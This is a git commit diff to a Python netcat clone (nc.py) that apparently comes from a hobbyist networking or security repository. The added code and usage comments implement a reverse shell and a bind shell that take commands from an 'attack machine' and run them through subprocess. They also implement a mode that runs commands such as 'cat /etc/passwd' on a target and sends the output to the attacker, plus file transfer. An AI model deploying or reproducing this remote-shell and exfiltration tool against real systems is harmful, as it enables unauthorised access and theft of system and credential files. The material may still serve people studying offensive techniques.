5c1c5819f445e1787697edcae4ca7cf0d9e84d15
yong <mail@yongtang.tech>
2021-12-04 19:08:51 -0500

    Add command execution function and comments

--- socket/tcp/nc.py
+++ socket/tcp/nc.py
@@ -1,34 +1,38 @@
-'''
-Requirements:
-netcat.py -t 192.168.1.108 -p 5555 -l -c # command shell
-netcat.py -t 192.168.1.108 -p 5555 -l -u=mytest.txt # upload to file
-netcat.py -t 192.168.1.108 -p 5555 -l -e=\"cat /etc/passwd\" # execute command
-echo 'ABC' | ./netcat.py -t 192.168.1.108 -p 135 # echo text to server port 135
-netcat.py -t 192.168.1.108 -p 5555 # connect to server
-'''
+
+#### USAGE:
+## Give a reverse shell to attack machine
+# nc.py -t 192.168.1.108 -p 6666 -r
+## Give a bind shell on target machine.
+# nc.py -t 192.168.1.108 -p 6666 -b
+## Accept uploaded file from attack machine
+# netcat.py -t 192.168.1.108 -p 6666  -u mytest.txt
+## Download a file from a TCP server
+# nc.py -t 192.168.1.108 -p 6666 -d mytest.txt
+## Execute command on target and transfer the result to attack machine
+# nc.py -t 192.168.1.108 -p 5555 -e "cat /etc/passwd"
+## Connect to attack machine.
+# nc.py -t 192.168.1.108 -p 5555
+
 
 import argparse
 import socket
 import shlex
 import subprocess
-import sys
-import textwrap
-import threading
 
 parser = argparse.ArgumentParser()
 parser.add_argument('-t', nargs='?',type=str,help='host')
 parser.add_argument('-p', nargs='?', type=int, help='port')
-parser.add_argument('-e', nargs='?',type=str, help='excute command')
-parser.add_argument('-u', nargs='?',type=str, help='upload to file')
-parser.add_argument('-l', action='store_true', help='listen')
-parser.add_argument('-r', action='store_true', help='reverse command shell')
-parser.add_argument('-b', action='store_true', help='binding command shell')
-parser.add_argument('-d', nargs='?',type=str, help='download command shell')
+parser.add_argument('-e', nargs='?',type=str, help='Execute command and transfer the result')
+parser.add_argument('-u', nargs='?',type=str, help='Accept uploaded file from attack machine')
+parser.add_argument('-r', action='store_true', help='Reverse command shell')
+parser.add_argument('-b', action='store_true', help='Bind command shell')
+parser.add_argument('-d', nargs='?',type=str, help='Download file from attack machine')
 
 opt = parser.parse_args()
 
 ######### Listen and Send ############
 
+# Bind local IP and port
 def listen(ip,port):
     # Listening socket
     ip = str(ip)
@@ -42,14 +46,15 @@ def listen(ip,port):
     print(f'[*] Connecting with {raddr}')
     return s, raddr
 
+# Create socket and connection with remote host
 def send():
-    # client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    # client.connect((ip,port))
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     s.connect((ip,port))
     return s
 
-########## shell, command #############
+########## shell, command excution #############
+
+# Execute a command on target and return the result.
 def execute(cmd):
     cmd = cmd.strip()
     if not cmd:
@@ -58,10 +63,11 @@ def execute(cmd):
     result = (result.decode())
     return result
 
+# Create a shell
 def shell_cmd(s):
    while True:
       s.send(b"#> ")
-      cmd = s.recv(1024).decode()
+      cmd = s.recv(1024).decode() # receive command instruction from attack host.
       result = execute(cmd)
       s.send(result.encode())
 
@@ -90,7 +96,7 @@ def upload(s,raddr,file_name):
 ## Client side: nc 120.0.0.1 6666
 
 def download(ip,port,file_name):
-    client = send(ip,port)
+    client = send()
     raddr = (ip,port)
     print(f'[*] Downloading file from:{raddr}')
     buf = b''
@@ -107,37 +113,45 @@ def download(ip,port,file_name):
 
 ################### main ##################################
 
+if opt.t and opt.p:
+     port = opt.p
+     ip =opt.t
+else:
+    print("Error: option -t and -p must be provided")
+    exit(1)
 
-if opt.r and opt.t and opt.p:      ## a reverse shell
-    ip = opt.t
-    port = opt.p
+## Reverse shell with -r, -t, -p options
+if opt.r:
     cmd = '/bin/bash'
     s = send()
     shell_cmd(s)
-elif opt.b and opt.t and opt.p:    ## bind shell
-    ip = opt.t
-    port = opt.p
+## Bind shell with -b, -t -p options
+elif opt.b:
     s, raddr = listen(ip, port)
     shell_cmd(s)
-elif opt.u and  opt.t and opt.p:   ## upload file
-    ip = opt.t
-    port = opt.p
+## Excute command and trensfter the result to attack machine
+elif opt.e:
+    cmd = opt.e
+    s = send()
+    result = execute(cmd)
+    s.send(result.encode())
+## Upload file with -u, -t,-p options
+elif opt.u:
     s, raddr = listen(ip, port)
     file_name = opt.u
     upload(s,raddr,file_name)
-elif opt.d and opt.t and opt.p:   ## download file
-    ip = opt.t
-    port = opt.p
+## Download file with -d, -t, -p options
+elif opt.d:
     file_name = opt.d
     download(ip,port,file_name)
-elif opt.t and opt.p:             ## connect with a TCP server
-    ip = opt.t
-    port = opt.p
-    client = send(ip, port)
+## Connect a TCP server with -t, -p options
+else:
+    client = send()
     while True:
          request = input('')
          client.send(request.encode())
          response = client.recv(1024)
+         print(response.decode())
 
 
 
@@ -147,70 +161,6 @@ elif opt.t and opt.p:             ## connect with a TCP server
 
 
 
-'''
-socket_raddr = server_listen(ip,port)
-
-socket_raddr = list(socket_raddr)
-raddr=(socket_raddr[1])
-
-server_shell(raddr)
-
-
-### shell, command,
-def server_execute(cmd):
-    cmd = cmd.strip()
-    if not cmd:
-        return
-    result = subprocess.check_output(shlex.split(cmd), stderr=subprocess.STDOUT)
-    result = (result.decode())
-    return result
-
-
-
-
-def server_listen():
-    # Listening socket
-    l_ip_port = ('0.0.0.0', 6666)
-    # Create a server and start listening
-    server = socket.socket()
-    server.bind(l_ip_port)
-    server.listen()
-    #s, remote = server.accept()
-    #print(f'[*] Connecting with {remote}')
-
-# Function
-def com():
-    while True:
-      s.send(b"#> ")
-      cmd = s.recv(1024).decode()
-      result = server_execute(cmd)
-      s.send(result.encode())
-     # Start receiving and sending data
-def tread():
-    com_thread = threading.Thread(target = com)
-    com_thread.start()
-
-### upload file
-
-def server_upload():
-    buf = b''
-    s, r_ip_port = server.accept()
-    print(f'[*] Uploading file from:{r_ip_port}')
-    while True:
-       data = s.recv(1024)
-       #print(data)
-       if data:
-          buf += data
-       else:
-          print(buf)
-          filename = 'upload.txt'
-          f = open(filename,'wb')
-          f.write(buf)
-          f.close()
-          break
-
-server_upload()
-'''
 
 
 
